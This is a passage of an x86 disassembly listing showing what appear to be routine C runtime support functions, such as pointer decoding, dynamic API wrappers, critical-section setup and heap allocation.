  4075b2:	87 01                	xchg   %eax,(%ecx)
  4075b4:	eb 16                	jmp    0x4075cc
  4075b6:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4075b9:	8b c6                	mov    %esi,%eax
  4075bb:	87 01                	xchg   %eax,(%ecx)
  4075bd:	85 c0                	test   %eax,%eax
  4075bf:	74 07                	je     0x4075c8
  4075c1:	56                   	push   %esi
  4075c2:	ff 15 a8 f0 40 00    	call   *0x40f0a8
  4075c8:	85 f6                	test   %esi,%esi
  4075ca:	75 13                	jne    0x4075df
  4075cc:	83 c7 04             	add    $0x4,%edi
  4075cf:	3b 7d 0c             	cmp    0xc(%ebp),%edi
  4075d2:	0f 85 55 ff ff ff    	jne    0x40752d
  4075d8:	33 c0                	xor    %eax,%eax
  4075da:	5f                   	pop    %edi
  4075db:	5e                   	pop    %esi
  4075dc:	5b                   	pop    %ebx
  4075dd:	c9                   	leave
  4075de:	c3                   	ret
  4075df:	8b c6                	mov    %esi,%eax
  4075e1:	eb f7                	jmp    0x4075da
  4075e3:	8b ff                	mov    %edi,%edi
  4075e5:	55                   	push   %ebp
  4075e6:	8b ec                	mov    %esp,%ebp
  4075e8:	8b 45 08             	mov    0x8(%ebp),%eax
  4075eb:	53                   	push   %ebx
  4075ec:	57                   	push   %edi
  4075ed:	8d 1c 85 b0 6e 41 00 	lea    0x416eb0(,%eax,4),%ebx
  4075f4:	8b 03                	mov    (%ebx),%eax
  4075f6:	90                   	nop
  4075f7:	8b 15 04 60 41 00    	mov    0x416004,%edx
  4075fd:	83 cf ff             	or     $0xffffffff,%edi
  407600:	8b ca                	mov    %edx,%ecx
  407602:	33 d0                	xor    %eax,%edx
  407604:	83 e1 1f             	and    $0x1f,%ecx
  407607:	d3 ca                	ror    %cl,%edx
  407609:	3b d7                	cmp    %edi,%edx
  40760b:	75 04                	jne    0x407611
  40760d:	33 c0                	xor    %eax,%eax
  40760f:	eb 51                	jmp    0x407662
  407611:	85 d2                	test   %edx,%edx
  407613:	74 04                	je     0x407619
  407615:	8b c2                	mov    %edx,%eax
  407617:	eb 49                	jmp    0x407662
  407619:	56                   	push   %esi
  40761a:	ff 75 14             	push   0x14(%ebp)
  40761d:	ff 75 10             	push   0x10(%ebp)
  407620:	e8 f7 fe ff ff       	call   0x40751c
  407625:	59                   	pop    %ecx
  407626:	59                   	pop    %ecx
  407627:	85 c0                	test   %eax,%eax
  407629:	74 1d                	je     0x407648
  40762b:	ff 75 0c             	push   0xc(%ebp)
  40762e:	50                   	push   %eax
  40762f:	ff 15 8c f0 40 00    	call   *0x40f08c
  407635:	8b f0                	mov    %eax,%esi
  407637:	85 f6                	test   %esi,%esi
  407639:	74 0d                	je     0x407648
  40763b:	56                   	push   %esi
  40763c:	e8 01 e5 ff ff       	call   0x405b42
  407641:	59                   	pop    %ecx
  407642:	87 03                	xchg   %eax,(%ebx)
  407644:	8b c6                	mov    %esi,%eax
  407646:	eb 19                	jmp    0x407661
  407648:	a1 04 60 41 00       	mov    0x416004,%eax
  40764d:	6a 20                	push   $0x20
  40764f:	83 e0 1f             	and    $0x1f,%eax
  407652:	59                   	pop    %ecx
  407653:	2b c8                	sub    %eax,%ecx
  407655:	d3 cf                	ror    %cl,%edi
  407657:	33 3d 04 60 41 00    	xor    0x416004,%edi
  40765d:	87 3b                	xchg   %edi,(%ebx)
  40765f:	33 c0                	xor    %eax,%eax
  407661:	5e                   	pop    %esi
  407662:	5f                   	pop    %edi
  407663:	5b                   	pop    %ebx
  407664:	5d                   	pop    %ebp
  407665:	c3                   	ret
  407666:	8b ff                	mov    %edi,%edi
  407668:	55                   	push   %ebp
  407669:	8b ec                	mov    %esp,%ebp
  40766b:	56                   	push   %esi
  40766c:	68 64 05 41 00       	push   $0x410564
  407671:	68 60 05 41 00       	push   $0x410560
  407676:	68 64 05 41 00       	push   $0x410564
  40767b:	6a 1c                	push   $0x1c
  40767d:	e8 61 ff ff ff       	call   0x4075e3
  407682:	8b f0                	mov    %eax,%esi
  407684:	83 c4 10             	add    $0x10,%esp
  407687:	85 f6                	test   %esi,%esi
  407689:	74 11                	je     0x40769c
  40768b:	ff 75 08             	push   0x8(%ebp)
  40768e:	8b ce                	mov    %esi,%ecx
  407690:	6a fa                	push   $0xfffffffa
  407692:	ff 15 24 f2 40 00    	call   *0x40f224
  407698:	ff d6                	call   *%esi
  40769a:	eb 05                	jmp    0x4076a1
  40769c:	b8 25 02 00 c0       	mov    $0xc0000225,%eax
  4076a1:	5e                   	pop    %esi
  4076a2:	5d                   	pop    %ebp
  4076a3:	c2 04 00             	ret    $0x4
  4076a6:	8b ff                	mov    %edi,%edi
  4076a8:	56                   	push   %esi
  4076a9:	e8 20 fe ff ff       	call   0x4074ce
  4076ae:	8b f0                	mov    %eax,%esi
  4076b0:	85 f6                	test   %esi,%esi
  4076b2:	74 0c                	je     0x4076c0
  4076b4:	8b ce                	mov    %esi,%ecx
  4076b6:	ff 15 24 f2 40 00    	call   *0x40f224
  4076bc:	ff d6                	call   *%esi
  4076be:	5e                   	pop    %esi
  4076bf:	c3                   	ret
  4076c0:	33 c0                	xor    %eax,%eax
  4076c2:	40                   	inc    %eax
  4076c3:	5e                   	pop    %esi
  4076c4:	c3                   	ret
  4076c5:	8b ff                	mov    %edi,%edi
  4076c7:	55                   	push   %ebp
  4076c8:	8b ec                	mov    %esp,%ebp
  4076ca:	56                   	push   %esi
  4076cb:	68 0c 05 41 00       	push   $0x41050c
  4076d0:	68 04 05 41 00       	push   $0x410504
  4076d5:	68 5c fd 40 00       	push   $0x40fd5c
  4076da:	6a 03                	push   $0x3
  4076dc:	e8 02 ff ff ff       	call   0x4075e3
  4076e1:	8b f0                	mov    %eax,%esi
  4076e3:	83 c4 10             	add    $0x10,%esp
  4076e6:	85 f6                	test   %esi,%esi
  4076e8:	74 0f                	je     0x4076f9
  4076ea:	ff 75 08             	push   0x8(%ebp)
  4076ed:	8b ce                	mov    %esi,%ecx
  4076ef:	ff 15 24 f2 40 00    	call   *0x40f224
  4076f5:	ff d6                	call   *%esi
  4076f7:	eb 06                	jmp    0x4076ff
  4076f9:	ff 15 90 f1 40 00    	call   *0x40f190
  4076ff:	5e                   	pop    %esi
  407700:	5d                   	pop    %ebp
  407701:	c2 04 00             	ret    $0x4
  407704:	8b ff                	mov    %edi,%edi
  407706:	55                   	push   %ebp
  407707:	8b ec                	mov    %esp,%ebp
  407709:	56                   	push   %esi
  40770a:	68 14 05 41 00       	push   $0x410514
  40770f:	68 0c 05 41 00       	push   $0x41050c
  407714:	68 70 fd 40 00       	push   $0x40fd70
  407719:	6a 04                	push   $0x4
  40771b:	e8 c3 fe ff ff       	call   0x4075e3
  407720:	8b f0                	mov    %eax,%esi
  407722:	83 c4 10             	add    $0x10,%esp
  407725:	85 f6                	test   %esi,%esi
  407727:	74 12                	je     0x40773b
  407729:	ff 75 08             	push   0x8(%ebp)
  40772c:	8b ce                	mov    %esi,%ecx
  40772e:	ff 15 24 f2 40 00    	call   *0x40f224
  407734:	ff d6                	call   *%esi
  407736:	5e                   	pop    %esi
  407737:	5d                   	pop    %ebp
  407738:	c2 04 00             	ret    $0x4
  40773b:	5e                   	pop    %esi
  40773c:	5d                   	pop    %ebp
  40773d:	ff 25 9c f1 40 00    	jmp    *0x40f19c
  407743:	8b ff                	mov    %edi,%edi
  407745:	55                   	push   %ebp
  407746:	8b ec                	mov    %esp,%ebp
  407748:	56                   	push   %esi
  407749:	68 1c 05 41 00       	push   $0x41051c
  40774e:	68 14 05 41 00       	push   $0x410514
  407753:	68 80 fd 40 00       	push   $0x40fd80
  407758:	6a 05                	push   $0x5
  40775a:	e8 84 fe ff ff       	call   0x4075e3
  40775f:	8b f0                	mov    %eax,%esi
  407761:	83 c4 10             	add    $0x10,%esp
  407764:	85 f6                	test   %esi,%esi
  407766:	74 12                	je     0x40777a
  407768:	ff 75 08             	push   0x8(%ebp)
  40776b:	8b ce                	mov    %esi,%ecx
  40776d:	ff 15 24 f2 40 00    	call   *0x40f224
  407773:	ff d6                	call   *%esi
  407775:	5e                   	pop    %esi
  407776:	5d                   	pop    %ebp
  407777:	c2 04 00             	ret    $0x4
  40777a:	5e                   	pop    %esi
  40777b:	5d                   	pop    %ebp
  40777c:	ff 25 94 f1 40 00    	jmp    *0x40f194
  407782:	8b ff                	mov    %edi,%edi
  407784:	55                   	push   %ebp
  407785:	8b ec                	mov    %esp,%ebp
  407787:	56                   	push   %esi
  407788:	68 24 05 41 00       	push   $0x410524
  40778d:	68 1c 05 41 00       	push   $0x41051c
  407792:	68 94 fd 40 00       	push   $0x40fd94
  407797:	6a 06                	push   $0x6
  407799:	e8 45 fe ff ff       	call   0x4075e3
  40779e:	8b f0                	mov    %eax,%esi
  4077a0:	83 c4 10             	add    $0x10,%esp
  4077a3:	85 f6                	test   %esi,%esi
  4077a5:	74 15                	je     0x4077bc
  4077a7:	ff 75 0c             	push   0xc(%ebp)
  4077aa:	8b ce                	mov    %esi,%ecx
  4077ac:	ff 75 08             	push   0x8(%ebp)
  4077af:	ff 15 24 f2 40 00    	call   *0x40f224
  4077b5:	ff d6                	call   *%esi
  4077b7:	5e                   	pop    %esi
  4077b8:	5d                   	pop    %ebp
  4077b9:	c2 08 00             	ret    $0x8
  4077bc:	5e                   	pop    %esi
  4077bd:	5d                   	pop    %ebp
  4077be:	ff 25 98 f1 40 00    	jmp    *0x40f198
  4077c4:	8b ff                	mov    %edi,%edi
  4077c6:	55                   	push   %ebp
  4077c7:	8b ec                	mov    %esp,%ebp
  4077c9:	56                   	push   %esi
  4077ca:	68 2c 05 41 00       	push   $0x41052c
  4077cf:	68 24 05 41 00       	push   $0x410524
  4077d4:	68 a8 fd 40 00       	push   $0x40fda8
  4077d9:	6a 12                	push   $0x12
  4077db:	e8 03 fe ff ff       	call   0x4075e3
  4077e0:	8b f0                	mov    %eax,%esi
  4077e2:	83 c4 10             	add    $0x10,%esp
  4077e5:	85 f6                	test   %esi,%esi
  4077e7:	74 15                	je     0x4077fe
  4077e9:	ff 75 10             	push   0x10(%ebp)
  4077ec:	8b ce                	mov    %esi,%ecx
  4077ee:	ff 75 0c             	push   0xc(%ebp)
  4077f1:	ff 75 08             	push   0x8(%ebp)
  4077f4:	ff 15 24 f2 40 00    	call   *0x40f224
  4077fa:	ff d6                	call   *%esi
  4077fc:	eb 0c                	jmp    0x40780a
  4077fe:	ff 75 0c             	push   0xc(%ebp)
  407801:	ff 75 08             	push   0x8(%ebp)
  407804:	ff 15 8c f1 40 00    	call   *0x40f18c
  40780a:	5e                   	pop    %esi
  40780b:	5d                   	pop    %ebp
  40780c:	c2 0c 00             	ret    $0xc
  40780f:	8b ff                	mov    %edi,%edi
  407811:	55                   	push   %ebp
  407812:	8b ec                	mov    %esp,%ebp
  407814:	56                   	push   %esi
  407815:	e8 ce fc ff ff       	call   0x4074e8
  40781a:	8b f0                	mov    %eax,%esi
  40781c:	85 f6                	test   %esi,%esi
  40781e:	74 27                	je     0x407847
  407820:	ff 75 28             	push   0x28(%ebp)
  407823:	8b ce                	mov    %esi,%ecx
  407825:	ff 75 24             	push   0x24(%ebp)
  407828:	ff 75 20             	push   0x20(%ebp)
  40782b:	ff 75 1c             	push   0x1c(%ebp)
  40782e:	ff 75 18             	push   0x18(%ebp)
  407831:	ff 75 14             	push   0x14(%ebp)
  407834:	ff 75 10             	push   0x10(%ebp)
  407837:	ff 75 0c             	push   0xc(%ebp)
  40783a:	ff 75 08             	push   0x8(%ebp)
  40783d:	ff 15 24 f2 40 00    	call   *0x40f224
  407843:	ff d6                	call   *%esi
  407845:	eb 20                	jmp    0x407867
  407847:	ff 75 1c             	push   0x1c(%ebp)
  40784a:	ff 75 18             	push   0x18(%ebp)
  40784d:	ff 75 14             	push   0x14(%ebp)
  407850:	ff 75 10             	push   0x10(%ebp)
  407853:	ff 75 0c             	push   0xc(%ebp)
  407856:	6a 00                	push   $0x0
  407858:	ff 75 08             	push   0x8(%ebp)
  40785b:	e8 0c 00 00 00       	call   0x40786c
  407860:	50                   	push   %eax
  407861:	ff 15 b0 f1 40 00    	call   *0x40f1b0
  407867:	5e                   	pop    %esi
  407868:	5d                   	pop    %ebp
  407869:	c2 24 00             	ret    $0x24
  40786c:	8b ff                	mov    %edi,%edi
  40786e:	55                   	push   %ebp
  40786f:	8b ec                	mov    %esp,%ebp
  407871:	56                   	push   %esi
  407872:	e8 8b fc ff ff       	call   0x407502
  407877:	8b f0                	mov    %eax,%esi
  407879:	85 f6                	test   %esi,%esi
  40787b:	74 12                	je     0x40788f
  40787d:	ff 75 0c             	push   0xc(%ebp)
  407880:	8b ce                	mov    %esi,%ecx
  407882:	ff 75 08             	push   0x8(%ebp)
  407885:	ff 15 24 f2 40 00    	call   *0x40f224
  40788b:	ff d6                	call   *%esi
  40788d:	eb 09                	jmp    0x407898
  40788f:	ff 75 08             	push   0x8(%ebp)
  407892:	e8 ba 30 00 00       	call   0x40a951
  407897:	59                   	pop    %ecx
  407898:	5e                   	pop    %esi
  407899:	5d                   	pop    %ebp
  40789a:	c2 08 00             	ret    $0x8
  40789d:	b9 38 6f 41 00       	mov    $0x416f38,%ecx
  4078a2:	b8 b0 6e 41 00       	mov    $0x416eb0,%eax
  4078a7:	33 d2                	xor    %edx,%edx
  4078a9:	3b c8                	cmp    %eax,%ecx
  4078ab:	56                   	push   %esi
  4078ac:	8b 35 04 60 41 00    	mov    0x416004,%esi
  4078b2:	1b c9                	sbb    %ecx,%ecx
  4078b4:	83 e1 de             	and    $0xffffffde,%ecx
  4078b7:	83 c1 22             	add    $0x22,%ecx
  4078ba:	42                   	inc    %edx
  4078bb:	89 30                	mov    %esi,(%eax)
  4078bd:	8d 40 04             	lea    0x4(%eax),%eax
  4078c0:	3b d1                	cmp    %ecx,%edx
  4078c2:	75 f6                	jne    0x4078ba
  4078c4:	b0 01                	mov    $0x1,%al
  4078c6:	5e                   	pop    %esi
  4078c7:	c3                   	ret
  4078c8:	8b ff                	mov    %edi,%edi
  4078ca:	55                   	push   %ebp
  4078cb:	8b ec                	mov    %esp,%ebp
  4078cd:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
  4078d1:	75 27                	jne    0x4078fa
  4078d3:	56                   	push   %esi
  4078d4:	be 60 6e 41 00       	mov    $0x416e60,%esi
  4078d9:	83 3e 00             	cmpl   $0x0,(%esi)
  4078dc:	74 10                	je     0x4078ee
  4078de:	83 3e ff             	cmpl   $0xffffffff,(%esi)
  4078e1:	74 08                	je     0x4078eb
  4078e3:	ff 36                	push   (%esi)
  4078e5:	ff 15 a8 f0 40 00    	call   *0x40f0a8
  4078eb:	83 26 00             	andl   $0x0,(%esi)
  4078ee:	83 c6 04             	add    $0x4,%esi
  4078f1:	81 fe b0 6e 41 00    	cmp    $0x416eb0,%esi
  4078f7:	75 e0                	jne    0x4078d9
  4078f9:	5e                   	pop    %esi
  4078fa:	b0 01                	mov    $0x1,%al
  4078fc:	5d                   	pop    %ebp
  4078fd:	c3                   	ret
  4078fe:	8b ff                	mov    %edi,%edi
  407900:	55                   	push   %ebp
  407901:	8b ec                	mov    %esp,%ebp
  407903:	56                   	push   %esi
  407904:	8b 75 0c             	mov    0xc(%ebp),%esi
  407907:	8b 06                	mov    (%esi),%eax
  407909:	3b 05 38 6f 41 00    	cmp    0x416f38,%eax
  40790f:	74 17                	je     0x407928
  407911:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407914:	a1 a0 66 41 00       	mov    0x4166a0,%eax
  407919:	85 81 50 03 00 00    	test   %eax,0x350(%ecx)
  40791f:	75 07                	jne    0x407928
  407921:	e8 4b 21 00 00       	call   0x409a71
  407926:	89 06                	mov    %eax,(%esi)
  407928:	5e                   	pop    %esi
  407929:	5d                   	pop    %ebp
  40792a:	c3                   	ret
  40792b:	8b ff                	mov    %edi,%edi
  40792d:	55                   	push   %ebp
  40792e:	8b ec                	mov    %esp,%ebp
  407930:	56                   	push   %esi
  407931:	8b 75 0c             	mov    0xc(%ebp),%esi
  407934:	8b 06                	mov    (%esi),%eax
  407936:	3b 05 9c 70 41 00    	cmp    0x41709c,%eax
  40793c:	74 17                	je     0x407955
  40793e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407941:	a1 a0 66 41 00       	mov    0x4166a0,%eax
  407946:	85 81 50 03 00 00    	test   %eax,0x350(%ecx)
  40794c:	75 07                	jne    0x407955
  40794e:	e8 e3 10 00 00       	call   0x408a36
  407953:	89 06                	mov    %eax,(%esi)
  407955:	5e                   	pop    %esi
  407956:	5d                   	pop    %ebp
  407957:	c3                   	ret
  407958:	8b ff                	mov    %edi,%edi
  40795a:	55                   	push   %ebp
  40795b:	8b ec                	mov    %esp,%ebp
  40795d:	51                   	push   %ecx
  40795e:	e8 9d f6 ff ff       	call   0x407000
  407963:	8b 48 4c             	mov    0x4c(%eax),%ecx
  407966:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  407969:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  40796c:	51                   	push   %ecx
  40796d:	50                   	push   %eax
  40796e:	e8 8b ff ff ff       	call   0x4078fe
  407973:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407976:	59                   	pop    %ecx
  407977:	59                   	pop    %ecx
  407978:	8b 00                	mov    (%eax),%eax
  40797a:	c9                   	leave
  40797b:	c3                   	ret
  40797c:	8b ff                	mov    %edi,%edi
  40797e:	56                   	push   %esi
  40797f:	57                   	push   %edi
  407980:	bf 40 6f 41 00       	mov    $0x416f40,%edi
  407985:	33 f6                	xor    %esi,%esi
  407987:	6a 00                	push   $0x0
  407989:	68 a0 0f 00 00       	push   $0xfa0
  40798e:	57                   	push   %edi
  40798f:	e8 30 fe ff ff       	call   0x4077c4
  407994:	85 c0                	test   %eax,%eax
  407996:	74 18                	je     0x4079b0
  407998:	ff 05 90 70 41 00    	incl   0x417090
  40799e:	83 c6 18             	add    $0x18,%esi
  4079a1:	83 c7 18             	add    $0x18,%edi
  4079a4:	81 fe 50 01 00 00    	cmp    $0x150,%esi
  4079aa:	72 db                	jb     0x407987
  4079ac:	b0 01                	mov    $0x1,%al
  4079ae:	eb 0a                	jmp    0x4079ba
  4079b0:	6a 00                	push   $0x0
  4079b2:	e8 1d 00 00 00       	call   0x4079d4
  4079b7:	59                   	pop    %ecx
  4079b8:	32 c0                	xor    %al,%al
  4079ba:	5f                   	pop    %edi
  4079bb:	5e                   	pop    %esi
  4079bc:	c3                   	ret
  4079bd:	8b ff                	mov    %edi,%edi
  4079bf:	55                   	push   %ebp
  4079c0:	8b ec                	mov    %esp,%ebp
  4079c2:	6b 45 08 18          	imul   $0x18,0x8(%ebp),%eax
  4079c6:	05 40 6f 41 00       	add    $0x416f40,%eax
  4079cb:	50                   	push   %eax
  4079cc:	ff 15 80 f1 40 00    	call   *0x40f180
  4079d2:	5d                   	pop    %ebp
  4079d3:	c3                   	ret
  4079d4:	8b ff                	mov    %edi,%edi
  4079d6:	56                   	push   %esi
  4079d7:	8b 35 90 70 41 00    	mov    0x417090,%esi
  4079dd:	85 f6                	test   %esi,%esi
  4079df:	74 20                	je     0x407a01
  4079e1:	6b c6 18             	imul   $0x18,%esi,%eax
  4079e4:	57                   	push   %edi
  4079e5:	8d b8 28 6f 41 00    	lea    0x416f28(%eax),%edi
  4079eb:	57                   	push   %edi
  4079ec:	ff 15 88 f1 40 00    	call   *0x40f188
  4079f2:	ff 0d 90 70 41 00    	decl   0x417090
  4079f8:	83 ef 18             	sub    $0x18,%edi
  4079fb:	83 ee 01             	sub    $0x1,%esi
  4079fe:	75 eb                	jne    0x4079eb
  407a00:	5f                   	pop    %edi
  407a01:	b0 01                	mov    $0x1,%al
  407a03:	5e                   	pop    %esi
  407a04:	c3                   	ret
  407a05:	8b ff                	mov    %edi,%edi
  407a07:	55                   	push   %ebp
  407a08:	8b ec                	mov    %esp,%ebp
  407a0a:	6b 45 08 18          	imul   $0x18,0x8(%ebp),%eax
  407a0e:	05 40 6f 41 00       	add    $0x416f40,%eax
  407a13:	50                   	push   %eax
  407a14:	ff 15 84 f1 40 00    	call   *0x40f184
  407a1a:	5d                   	pop    %ebp
  407a1b:	c3                   	ret
  407a1c:	8b ff                	mov    %edi,%edi
  407a1e:	55                   	push   %ebp
  407a1f:	8b ec                	mov    %esp,%ebp
  407a21:	56                   	push   %esi
  407a22:	8b 75 08             	mov    0x8(%ebp),%esi
  407a25:	83 fe e0             	cmp    $0xffffffe0,%esi
  407a28:	77 30                	ja     0x407a5a
  407a2a:	85 f6                	test   %esi,%esi
  407a2c:	75 17                	jne    0x407a45
  407a2e:	46                   	inc    %esi
  407a2f:	eb 14                	jmp    0x407a45
  407a31:	e8 a6 eb ff ff       	call   0x4065dc
  407a36:	85 c0                	test   %eax,%eax
  407a38:	74 20                	je     0x407a5a
  407a3a:	56                   	push   %esi
  407a3b:	e8 01 df ff ff       	call   0x405941
  407a40:	59                   	pop    %ecx
  407a41:	85 c0                	test   %eax,%eax
  407a43:	74 15                	je     0x407a5a
  407a45:	56                   	push   %esi
  407a46:	6a 00                	push   $0x0
  407a48:	ff 35 d4 72 41 00    	push   0x4172d4
  407a4e:	ff 15 b4 f1 40 00    	call   *0x40f1b4
  407a54:	85 c0                	test   %eax,%eax
  407a56:	74 d9                	je     0x407a31
  407a58:	eb 0d                	jmp    0x407a67
  407a5a:	e8 5c fa ff ff       	call   0x4074bb
  407a5f:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  407a65:	33 c0                	xor    %eax,%eax
  407a67:	5e                   	pop    %esi
  407a68:	5d                   	pop    %ebp
  407a69:	c3                   	ret
  407a6a:	8b ff                	mov    %edi,%edi
  407a6c:	55                   	push   %ebp
  407a6d:	8b ec                	mov    %esp,%ebp
  407a6f:	56                   	push   %esi
  407a70:	8b 75 08             	mov    0x8(%ebp),%esi
  407a73:	85 f6                	test   %esi,%esi
  407a75:	74 0c                	je     0x407a83
  407a77:	6a e0                	push   $0xffffffe0
  407a79:	33 d2                	xor    %edx,%edx
  407a7b:	58                   	pop    %eax
  407a7c:	f7 f6                	div    %esi
  407a7e:	3b 45 0c             	cmp    0xc(%ebp),%eax
  407a81:	72 34                	jb     0x407ab7
  407a83:	0f af 75 0c          	imul   0xc(%ebp),%esi
  407a87:	85 f6                	test   %esi,%esi
  407a89:	75 17                	jne    0x407aa2
  407a8b:	46                   	inc    %esi
  407a8c:	eb 14                	jmp    0x407aa2
  407a8e:	e8 49 eb ff ff       	call   0x4065dc
  407a93:	85 c0                	test   %eax,%eax
  407a95:	74 20                	je     0x407ab7
  407a97:	56                   	push   %esi
  407a98:	e8 a4 de ff ff       	call   0x405941
  407a9d:	59                   	pop    %ecx
  407a9e:	85 c0                	test   %eax,%eax
  407aa0:	74 15                	je     0x407ab7
  407aa2:	56                   	push   %esi
  407aa3:	6a 08                	push   $0x8
  407aa5:	ff 35 d4 72 41 00    	push   0x4172d4
  407aab:	ff 15 b4 f1 40 00    	call   *0x40f1b4
  407ab1:	85 c0                	test   %eax,%eax
  407ab3:	74 d9                	je     0x407a8e
  407ab5:	eb 0d                	jmp    0x407ac4
  407ab7:	e8 ff f9 ff ff       	call   0x4074bb
  407abc:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  407ac2:	33 c0                	xor    %eax,%eax
  407ac4:	5e                   	pop    %esi
  407ac5:	5d                   	pop    %ebp
  407ac6:	c3                   	ret
  407ac7:	8b ff                	mov    %edi,%edi
  407ac9:	55                   	push   %ebp
  407aca:	8b ec                	mov    %esp,%ebp
  407acc:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  407ad0:	74 2d                	je     0x407aff
  407ad2:	ff 75 08             	push   0x8(%ebp)
  407ad5:	6a 00                	push   $0x0
  407ad7:	ff 35 d4 72 41 00    	push   0x4172d4
  407add:	ff 15 b8 f1 40 00    	call   *0x40f1b8
  407ae3:	85 c0                	test   %eax,%eax
  407ae5:	75 18                	jne    0x407aff
  407ae7:	56                   	push   %esi
  407ae8:	e8 ce f9 ff ff       	call   0x4074bb
  407aed:	8b f0                	mov    %eax,%esi
  407aef:	ff 15 70 f0 40 00    	call   *0x40f070
  407af5:	50                   	push   %eax
  407af6:	e8 47 f9 ff ff       	call   0x407442
  407afb:	59                   	pop    %ecx
  407afc:	89 06                	mov    %eax,(%esi)
  407afe:	5e                   	pop    %esi
  407aff:	5d                   	pop    %ebp
  407b00:	c3                   	ret
  407b01:	8b ff                	mov    %edi,%edi
  407b03:	55                   	push   %ebp
  407b04:	8b ec                	mov    %esp,%ebp
  407b06:	8b 45 0c             	mov    0xc(%ebp),%eax
  407b09:	3b 45 08             	cmp    0x8(%ebp),%eax
  407b0c:	76 05                	jbe    0x407b13
  407b0e:	83 c8 ff             	or     $0xffffffff,%eax
  407b11:	5d                   	pop    %ebp
  407b12:	c3                   	ret
  407b13:	1b c0                	sbb    %eax,%eax
  407b15:	f7 d8                	neg    %eax
  407b17:	5d                   	pop    %ebp
  407b18:	c3                   	ret
  407b19:	8b ff                	mov    %edi,%edi
  407b1b:	55                   	push   %ebp
  407b1c:	8b ec                	mov    %esp,%ebp
  407b1e:	56                   	push   %esi
  407b1f:	8b 75 08             	mov    0x8(%ebp),%esi
  407b22:	57                   	push   %edi
  407b23:	85 f6                	test   %esi,%esi
  407b25:	75 1a                	jne    0x407b41
  407b27:	8b 75 0c             	mov    0xc(%ebp),%esi
  407b2a:	8b ce                	mov    %esi,%ecx
  407b2c:	e8 bc 06 00 00       	call   0x4081ed
  407b31:	33 ff                	xor    %edi,%edi
  407b33:	89 7e 08             	mov    %edi,0x8(%esi)
  407b36:	89 7e 0c             	mov    %edi,0xc(%esi)
  407b39:	89 7e 10             	mov    %edi,0x10(%esi)
  407b3c:	e9 84 00 00 00       	jmp    0x407bc5
  407b41:	33 ff                	xor    %edi,%edi
  407b43:	80 3e 00             	cmpb   $0x0,(%esi)
  407b46:	75 1f                	jne    0x407b67
  407b48:	8b 75 0c             	mov    0xc(%ebp),%esi
  407b4b:	39 7e 0c             	cmp    %edi,0xc(%esi)
  407b4e:	75 0d                	jne    0x407b5d
  407b50:	6a 01                	push   $0x1
  407b52:	8b ce                	mov    %esi,%ecx
  407b54:	e8 ea 06 00 00       	call   0x408243
  407b59:	85 c0                	test   %eax,%eax
  407b5b:	75 6a                	jne    0x407bc7
  407b5d:	8b 46 08             	mov    0x8(%esi),%eax
  407b60:	33 c9                	xor    %ecx,%ecx
  407b62:	66 89 08             	mov    %cx,(%eax)
  407b65:	eb d2                	jmp    0x407b39
  407b67:	57                   	push   %edi
  407b68:	57                   	push   %edi
  407b69:	6a ff                	push   $0xffffffff
  407b6b:	56                   	push   %esi
  407b6c:	6a 09                	push   $0x9
  407b6e:	ff 75 14             	push   0x14(%ebp)
  407b71:	e8 cf 11 00 00       	call   0x408d45
  407b76:	83 c4 18             	add    $0x18,%esp
  407b79:	85 c0                	test   %eax,%eax
  407b7b:	75 16                	jne    0x407b93
  407b7d:	ff 15 70 f0 40 00    	call   *0x40f070
  407b83:	50                   	push   %eax
  407b84:	e8 fc f8 ff ff       	call   0x407485
  407b89:	59                   	pop    %ecx
  407b8a:	e8 2c f9 ff ff       	call   0x4074bb
  407b8f:	8b 00                	mov    (%eax),%eax
  407b91:	eb 34                	jmp    0x407bc7
  407b93:	8b 7d 0c             	mov    0xc(%ebp),%edi
  407b96:	3b 47 0c             	cmp    0xc(%edi),%eax
  407b99:	76 0c                	jbe    0x407ba7
  407b9b:	50                   	push   %eax
  407b9c:	8b cf                	mov    %edi,%ecx
  407b9e:	e8 a0 06 00 00       	call   0x408243
  407ba3:	85 c0                	test   %eax,%eax
  407ba5:	75 20                	jne    0x407bc7
  407ba7:	ff 77 0c             	push   0xc(%edi)
  407baa:	ff 77 08             	push   0x8(%edi)
  407bad:	6a ff                	push   $0xffffffff
  407baf:	56                   	push   %esi
  407bb0:	6a 09                	push   $0x9
  407bb2:	ff 75 14             	push   0x14(%ebp)
  407bb5:	e8 8b 11 00 00       	call   0x408d45
  407bba:	83 c4 18             	add    $0x18,%esp
  407bbd:	85 c0                	test   %eax,%eax
  407bbf:	74 bc                	je     0x407b7d
  407bc1:	48                   	dec    %eax
  407bc2:	89 47 10             	mov    %eax,0x10(%edi)
  407bc5:	33 c0                	xor    %eax,%eax
  407bc7:	5f                   	pop    %edi
  407bc8:	5e                   	pop    %esi
  407bc9:	5d                   	pop    %ebp
  407bca:	c3                   	ret
  407bcb:	8b ff                	mov    %edi,%edi
  407bcd:	55                   	push   %ebp
  407bce:	8b ec                	mov    %esp,%ebp
  407bd0:	53                   	push   %ebx
  407bd1:	56                   	push   %esi
  407bd2:	8b 75 08             	mov    0x8(%ebp),%esi
  407bd5:	85 f6                	test   %esi,%esi
  407bd7:	75 1c                	jne    0x407bf5
  407bd9:	8b 75 0c             	mov    0xc(%ebp),%esi
  407bdc:	8b ce                	mov    %esi,%ecx
  407bde:	e8 0a 06 00 00       	call   0x4081ed
  407be3:	33 db                	xor    %ebx,%ebx
  407be5:	89 5e 08             	mov    %ebx,0x8(%esi)
  407be8:	89 5e 0c             	mov    %ebx,0xc(%esi)
  407beb:	89 5e 10             	mov    %ebx,0x10(%esi)
  407bee:	33 c0                	xor    %eax,%eax
  407bf0:	e9 a1 00 00 00       	jmp    0x407c96
  407bf5:	33 db                	xor    %ebx,%ebx
  407bf7:	66 39 1e             	cmp    %bx,(%esi)
  407bfa:	75 20                	jne    0x407c1c
  407bfc:	8b 75 0c             	mov    0xc(%ebp),%esi
  407bff:	39 5e 0c             	cmp    %ebx,0xc(%esi)
  407c02:	75 11                	jne    0x407c15
  407c04:	6a 01                	push   $0x1
  407c06:	8b ce                	mov    %esi,%ecx
